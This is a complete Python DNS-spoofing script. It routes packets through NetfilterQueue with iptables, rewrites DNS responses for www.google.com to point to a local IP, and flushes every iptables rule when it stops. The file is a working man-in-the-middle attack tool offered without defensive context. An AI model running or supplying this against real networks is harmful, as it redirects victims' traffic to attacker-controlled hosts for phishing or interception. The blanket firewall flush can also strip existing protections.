
import netfilterqueue
from scapy.all import IP,DNSRR,DNSQR,DNS,UDP
import subprocess

from colorama import init, Fore

#initialize colorama

init()

#define color

GREEN = Fore.GREEN
RESET = Fore.RESET
RED = Fore.RED

def process_packet(packet):

    scapy_packets = IP(packet.get_payload())
    if scapy_packets.haslayer(DNSRR):
        qname = scapy_packets[DNSQR].qname
        if b'www.google.com' in qname  :
            print("[+] Spoofing target")
            answer = DNSRR(rrname=qname, rdata="192.168.1.28")
            scapy_packets[DNS].an = answer
            scapy_packets[DNS].ancount = 1

            del scapy_packets[IP].len
            del scapy_packets[IP].chksum
            del scapy_packets[UDP].len
            del scapy_packets[UDP].chksum

            packet.set_payload(bytes(scapy_packets))
    packet.accept()

def forward_iptables():
    #This command to spoof on the local machine
    subprocess.call(["iptables -I OUTPUT -j NFQUEUE --queue-num 1"], shell=True)
    subprocess.call(["iptables -I INPUT -j NFQUEUE --queue-num 1"], shell=True)
    print(f"\n{RED}IPtables Forward connection {RESET}\n")
"""
    #This command to spoof on Remote machine
    subprocess.call(["iptables -I INPUT -j NFQUEUE --queue-num 1"], shell=True)
    print(f"\n{RED}IPtables Forward connection {RESET}\n")
    """


def flush_iptable():
    subprocess.call(["iptables --flush"], shell=True)
    print(f"\n{GREEN}Restore Iptables {RESET}\n")

try:
    forward_iptables()
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(1, process_packet)
        queue.run()
except KeyboardInterrupt:
    flush_iptable()

